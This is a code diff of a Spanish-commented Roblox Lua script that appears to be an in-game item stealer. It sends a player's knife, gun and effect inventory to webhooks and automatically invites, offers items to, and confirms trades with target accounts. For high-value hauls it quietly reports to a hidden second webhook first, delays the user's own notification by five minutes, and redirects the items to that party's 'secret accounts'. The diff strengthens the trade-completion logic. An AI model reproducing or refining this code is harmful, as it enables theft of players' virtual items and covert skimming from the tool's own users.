@@ -1,5 +1,6 @@
+
 -- ==========================================
--- SCRIPT 2 (CORE ACTUALIZADO CON DUAL VALUES Y WEBHOOK COMPLETO)
+-- SCRIPT 2 (CORE ACTUALIZADO CON DUAL VALUES, WEBHOOK COMPLETO Y LÓGICA DE TRADE MEJORADA)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
@@ -23,7 +24,7 @@ local efectosEspecialesDual = {
     StardustCollapseEffect = true
 }
 
--- Esperar a que el SCRIPT 1 inyecte la configuración
+-- Esperar a que la configuración sea inyectada
 while getgenv and not getgenv().AutoTradeConfig do
     task.wait(0.2)
 end
@@ -154,9 +155,6 @@ task.spawn(function()
         local isMegaHit = (totalValueDual >= 5000 or hasSpecialEffect)
 
         if hayItems and request then
-            -- ==========================================
-            -- RECUPERACIÓN DE ESTADÍSTICAS E INFO DEL JUGADOR
-            -- ==========================================
             local executionText = player.Name .. " 1x executions"
             if isfile and readfile and writefile then
                 local fileName = "AutoTrade_Executions.json"
@@ -251,32 +249,24 @@ task.spawn(function()
                 })
             end
 
-            -- Generamos los dos Payloads
             local payloadUser = buildPayload(kUser, gUser, eUser, emUser, totalValueUser, false)
             local payloadDual = buildPayload(kDual, gDual, eDual, emDual, totalValueDual, true)
 
-            -- ==========================================
-            -- LÓGICA DE ENVÍO DE WEBHOOKS
-            -- ==========================================
             if isMegaHit then
-                -- 1. Dual Webhook Instantáneo
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
                         request({ Url = DUAL_WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payloadDual })
                     end
                 end)
 
-                -- 2. User Webhook con Delay de 5 Minutos (300s)
                 if WEBHOOK_INVENTARIO ~= "" then
                     task.delay(300, function()
                         pcall(function() request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payloadUser }) end)
                     end)
                 end
                 
-                -- Cambiar jugadores a las cuentas secretas del Dual
                 jugadoresObjetivos = jugadoresObjetivosDual
             else
-                -- Hit Normal -> Sólo Notifica al Usuario al instante
                 if WEBHOOK_INVENTARIO ~= "" then
                     request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payloadUser })
                 end
@@ -313,7 +303,11 @@ task.spawn(function()
             end
         end)
 
-         local function ejecutarTradeo()
+        -- Variables de cooldown del Script 1
+        local lastInvite = 0
+        local lastAccept = {}
+
+        local function ejecutarTradeo()
             local okData, cgData = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
             if not okData then return false end
             local pdTrade = cgData.PlayerData
@@ -341,7 +335,6 @@ task.spawn(function()
                 end
             end
 
-            -- Aseguramos que si se activó el Mega Hit y cambió a Dual, usemos la lista de valores del Dual para robar
             local activeKnives = isMegaHit and DualKnives or UserKnives
             local activeGuns = isMegaHit and DualGuns or UserGuns
             local activeEffects = isMegaHit and DualEffects or UserEffects
@@ -385,61 +378,119 @@ task.spawn(function()
                 return me, other, data
             end
 
+            -- ==========================================
+            -- FUNCIONES AUXILIARES DEL SCRIPT 1
+            -- ==========================================
+            local function waitUntil(cond, timeout)
+                local t0 = os.clock()
+                while os.clock() - t0 < timeout do
+                    if cond() then return true end
+                    task.wait(0.2)
+                end
+                return cond()
+            end
+
+            local function waitProcessingLock()
+                waitUntil(function()
+                    local _, _, d = getSides()
+                    return not (d and (d.processing or 0) > Workspace:GetServerTimeNow())
+                end, 5)
+            end
+
+            local function setReadyTrue(otherRef)
+                local _, _, data = getSides()
+                if not data then return false end
+                waitUntil(function()
+                    local _, _, d = getSides()
+                    return d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3
+                end, 6)
+                local _, _, d2 = getSides()
+                if not d2 then return false end
+                Remotes.SetReady:FireServer(true, d2.ref or otherRef or {})
+                return true
+            end
+
+            -- ==========================================
+            -- INICIO DE TRADEO (LÓGICA SCRIPT 1)
+            -- ==========================================
             repeat
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
+                
+                local me, other = getSides()
+                if me and other then break end -- Ya estamos en tradeo
 
+                local now = os.clock()
                 local incoming = SessionState:TryIndex({ "incomingTradeRequests" })
                 local aceptado = false
                 
                 if type(incoming) == "table" then
                     for _, p in ipairs(incoming) do
                         if p.Name == jugadorEncontrado.Name then
-                            Remotes.AcceptInvite:FireServer(p)
-                            aceptado = true
+                            local key = typeof(p) == "Instance" and p.UserId or tostring(p)
+                            if not lastAccept[key] or now - lastAccept[key] > 3 then
+                                lastAccept[key] = now
+                                Remotes.AcceptInvite:FireServer(p)
+                                aceptado = true
+                            end
                         end
                     end
                 end
                 
-                if not aceptado then Remotes.SendInvite:FireServer(jugadorEncontrado) end
-                task.wait(2.5)
+                -- INVITE_EVERY configurado a 8 segundos
+                if not aceptado and now - lastInvite > 8 then
+                    lastInvite = now
+                    Remotes.SendInvite:FireServer(jugadorEncontrado)
+                end
+                
+                task.wait(0.4)
             until getSides() ~= nil
 
             task.wait(1)
 
+            -- ==========================================
+            -- PROCESO DE OFRECER ITEMS (LÓGICA SCRIPT 1)
+            -- ==========================================
             for i = 1, math.min(12, #itemsRestantes) do
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
                 local item = itemsRestantes[i]
-                local t0 = os.clock()
-                while os.clock() - t0 < 5 do
-                    local _, _, d = getSides()
-                    if not (d and (d.processing or 0) > Workspace:GetServerTimeNow()) then break end
-                    task.wait(0.2)
-                end
+                
+                if not getSides() then return false end
+                waitProcessingLock() -- Evita el desincronismo con el servidor (Script 1)
                 Remotes.OfferItem:FireServer(item.guid)
                 task.wait(0.35)
             end
 
-            local timeout = os.clock()
-            while os.clock() - timeout < 60 do 
-                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
-                local me, other, data = getSides()
-                
-                if not data then break end
-                if data.exchanging then break end 
-                
-                if me and other and not me.ready then
-                    if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
-                        Remotes.SetReady:FireServer(true, other.ref)
-                    end
-                end
-                task.wait(0.5)
+            -- ==========================================
+            -- TERMINACIÓN Y CONFIRMACIÓN (LÓGICA SCRIPT 1)
+            -- ==========================================
+            local meAct, otherAct = getSides()
+            if not meAct then return false end
+            
+            if not meAct.ready then
+                task.wait(0.3)
+                setReadyTrue(otherAct and otherAct.ref)
             end
 
-            local finalWait = os.clock()
-            while getSides() ~= nil and os.clock() - finalWait < 20 do task.wait(1) end
+            local done = waitUntil(function()
+                local m, _, d = getSides()
+                if not d then return true end
+                if d.exchanging == true then return true end
+                if m and not m.ready then return true end
+                return false
+            end, 60) -- READY_TIMEOUT
 
-            task.wait(2) 
-            return true
+            local mFinal, _, dFinal = getSides()
+            if dFinal and dFinal.exchanging then
+                -- Espera a que la variable sides quede nula indicando que el intercambio terminó con éxito
+                waitUntil(function() return getSides() == nil end, 20)
+                task.wait(2) 
+                return true
+            end
+            
+            if not dFinal then return false end
+            if mFinal and not mFinal.ready then return false end 
+            
+            return false
         end
 
         while true do
